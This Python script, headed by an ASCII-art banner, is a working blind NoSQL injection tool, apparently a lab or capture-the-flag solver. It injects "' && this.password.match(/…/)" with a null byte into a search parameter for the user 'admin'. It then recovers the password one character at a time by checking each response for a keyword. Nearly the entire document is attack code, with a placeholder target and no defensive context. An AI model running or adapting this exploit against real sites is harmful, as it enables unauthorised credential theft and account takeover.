#  ____  __.                      __         .__            __
# |    |/ _|______ ___.__._______/  |_  ____ |  |__ _____  |  | __ ___________
# |      < \_  __ <   |  |\____ \   __\/  _ \|  |  \\__  \ |  |/ // __ \_  __ \
# |    |  \ |  | \/\___  ||  |_> >  | (  <_> )   Y  \/ __ \|    <\  ___/|  | \/
# |____|__ \|__|   / ____||   __/|__|  \____/|___|  (____  /__|_ \\___  >__|
#         \/       \/     |__|                    \/     \/     \/    \/

import urllib.request
import string

target = "TARGET_URL"
pattern = "tagkeywordtag"

lowercase = string.ascii_lowercase
uppercase = string.ascii_uppercase
digits = string.digits
other = "-"
attempts = list(uppercase + lowercase + digits + other)


def inject_payload(payload=None, target=None, pattern=None, username=None):
    t = target + "/?search=" + username + "%27%20%26%26%20this.password.match(/" + payload + "/)%00"
    response = urllib.request.urlopen(t)
    data = response.read()
    return pattern in str(data)


def brute_force(password="", target=None, pattern=None, username=None):
    for attempt in attempts:
        print("Attempting: " + attempt + ", Current pattern " + password)
        attempted = password + attempt
        inject_payload("^" + attempted + ".*$", target, pattern, username)
        if inject_payload("^" + attempted + ".*$", target, pattern, username):
            password += attempt
            print("Last found pattern: " + password)
            brute_force(password, target, pattern, username)
            break
        elif attempt == attempts[-1]:
            print("Last found pattern: " + password)
            exit(0)


print("Started bruteforcing the target: " + target)
brute_force("", target, pattern, "admin")
